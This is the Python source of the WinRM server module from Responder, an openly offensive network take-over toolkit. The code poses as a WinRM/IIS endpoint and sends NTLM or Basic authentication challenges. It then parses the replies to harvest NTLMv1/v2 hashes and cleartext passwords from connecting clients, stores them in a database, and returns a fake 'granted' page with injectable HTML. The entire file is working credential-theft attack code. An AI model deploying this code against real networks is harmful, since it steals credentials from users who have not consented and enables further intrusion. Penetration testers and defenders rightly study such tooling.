#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import codecs
from responder.src.utils import *
from responder.src import settings

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler, StreamRequestHandler
else:
    from SocketServer import BaseRequestHandler, StreamRequestHandler
from base64 import b64decode, b64encode
from responder.src.packets import NTLM_Challenge
from responder.src.packets import (
    IIS_Auth_401_Ans,
    IIS_Auth_Granted,
    IIS_NTLM_Challenge_Ans,
    IIS_Basic_401_Ans,
    WEBDAV_Options_Answer,
    WinRM_NTLM_Challenge_Ans,
)
from responder.src.packets import WPADScript, ServeExeFile, ServeHtmlFile


# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, Challenge, client, module):
    LMhashLen = struct.unpack("<H", data[12:14])[0]
    LMhashOffset = struct.unpack("<H", data[16:18])[0]
    LMHash = data[LMhashOffset : LMhashOffset + LMhashLen]
    LMHashFinal = codecs.encode(LMHash, "hex").upper().decode("latin-1")

    NthashLen = struct.unpack("<H", data[20:22])[0]
    NthashOffset = struct.unpack("<H", data[24:26])[0]
    NTHash = data[NthashOffset : NthashOffset + NthashLen]
    NTHashFinal = codecs.encode(NTHash, "hex").upper().decode("latin-1")
    UserLen = struct.unpack("<H", data[36:38])[0]
    UserOffset = struct.unpack("<H", data[40:42])[0]
    User = data[UserOffset : UserOffset + UserLen].decode("latin-1").replace("\x00", "")
    Challenge1 = codecs.encode(Challenge, "hex").decode("latin-1")
    if NthashLen == 24:
        HostNameLen = struct.unpack("<H", data[46:48])[0]
        HostNameOffset = struct.unpack("<H", data[48:50])[0]
        HostName = (
            data[HostNameOffset : HostNameOffset + HostNameLen]
            .decode("latin-1")
            .replace("\x00", "")
        )
        WriteHash = "%s::%s:%s:%s:%s" % (
            User,
            HostName,
            LMHashFinal,
            NTHashFinal,
            Challenge1,
        )
        SaveToDb(
            {
                "module": module,
                "type": "NTLMv1",
                "client": client,
                "host": HostName,
                "user": User,
                "hash": LMHashFinal + ":" + NTHashFinal,
                "fullhash": WriteHash,
            }
        )

    if NthashLen > 24:
        NthashLen = 64
        DomainLen = struct.unpack("<H", data[28:30])[0]
        DomainOffset = struct.unpack("<H", data[32:34])[0]
        Domain = (
            data[DomainOffset : DomainOffset + DomainLen]
            .decode("latin-1")
            .replace("\x00", "")
        )
        HostNameLen = struct.unpack("<H", data[44:46])[0]
        HostNameOffset = struct.unpack("<H", data[48:50])[0]
        HostName = (
            data[HostNameOffset : HostNameOffset + HostNameLen]
            .decode("latin-1")
            .replace("\x00", "")
        )
        WriteHash = "%s::%s:%s:%s:%s" % (
            User,
            Domain,
            Challenge1,
            NTHashFinal[:32],
            NTHashFinal[32:],
        )
        SaveToDb(
            {
                "module": module,
                "type": "NTLMv2",
                "client": client,
                "host": HostName,
                "user": Domain + "\\" + User,
                "hash": NTHashFinal[:32] + ":" + NTHashFinal[32:],
                "fullhash": WriteHash,
            }
        )


# Handle HTTP packet sequence.
def PacketSequence(data, client, Challenge):
    NTLM_Auth = re.findall(r"(?<=Authorization: NTLM )[^\r]*", data)
    NTLM_Auth2 = re.findall(r"(?<=Authorization: Negotiate )[^\r]*", data)
    Basic_Auth = re.findall(r"(?<=Authorization: Basic )[^\r]*", data)

    if NTLM_Auth or NTLM_Auth2:
        if NTLM_Auth2:
            Packet_NTLM = b64decode("".join(NTLM_Auth2))[8:9]
        if NTLM_Auth:
            Packet_NTLM = b64decode("".join(NTLM_Auth))[8:9]

        if Packet_NTLM == b"\x01":
            Buffer = NTLM_Challenge(
                NegoFlags="\x35\x82\x89\xe2",
                ServerChallenge=NetworkRecvBufferPython2or3(Challenge),
            )
            Buffer.calculate()
            if NTLM_Auth2:
                Buffer_Ans = WinRM_NTLM_Challenge_Ans(
                    Payload=b64encode(NetworkSendBufferPython2or3(Buffer)).decode(
                        "latin-1"
                    )
                )
                return Buffer_Ans
            else:
                Buffer_Ans = IIS_NTLM_Challenge_Ans(
                    Payload=b64encode(NetworkSendBufferPython2or3(Buffer)).decode(
                        "latin-1"
                    )
                )
                return Buffer_Ans

        if Packet_NTLM == b"\x03":
            if NTLM_Auth2:
                NTLM_Auth = b64decode("".join(NTLM_Auth2))
            else:
                NTLM_Auth = b64decode("".join(NTLM_Auth))

            ParseHTTPHash(NTLM_Auth, Challenge, client, "WinRM")
            Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
            Buffer.calculate()
            return Buffer

    elif Basic_Auth:
        ClearText_Auth = b64decode("".join(Basic_Auth))

        SaveToDb(
            {
                "module": "WinRM",
                "type": "Basic",
                "client": client,
                "user": ClearText_Auth.decode("latin-1").split(":")[0],
                "cleartext": ClearText_Auth.decode("latin-1").split(":")[1],
            }
        )

        Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
        Buffer.calculate()
        return Buffer
    else:
        if settings.Config.Basic:
            r = IIS_Basic_401_Ans()
            r.calculate()
            Response = r
            if settings.Config.Verbose:
                print(
                    text(
                        "[WinRM] Sending BASIC authentication request to %s"
                        % client.replace("::ffff:", "")
                    )
                )

        else:
            r = IIS_Auth_401_Ans()
            r.calculate()
            Response = r
            if settings.Config.Verbose:
                print(
                    text(
                        "[WinRM] Sending NTLM authentication request to %s"
                        % client.replace("::ffff:", "")
                    )
                )

        return Response


# HTTP Server class
class WinRM(BaseRequestHandler):

    def handle(self):
        try:
            Challenge = RandomChallenge()
            while True:
                self.request.settimeout(3)
                remaining = 10 * 1024 * 1024  # setting max recieve size
                data = ""
                while True:
                    buff = ""
                    buff = NetworkRecvBufferPython2or3(self.request.recv(8092))
                    if buff == "":
                        break
                    data += buff
                    remaining -= len(buff)
                    # check if we recieved the full header
                    if data.find("\r\n\r\n") != -1:
                        # we did, now to check if there was anything else in the request besides the header
                        if data.find("Content-Length") == -1:
                            # request contains only header
                            break
                        else:
                            # searching for that content-length field in the header
                            for line in data.split("\r\n"):
                                if line.find("Content-Length") != -1:
                                    line = line.strip()
                                    remaining = int(line.split(":")[1].strip()) - len(
                                        data
                                    )
                    if remaining <= 0:
                        break
                if data == "":
                    break

                else:
                    Buffer = PacketSequence(data, self.client_address[0], Challenge)
                    self.request.send(NetworkSendBufferPython2or3(Buffer))

        except:
            self.request.close()
            pass
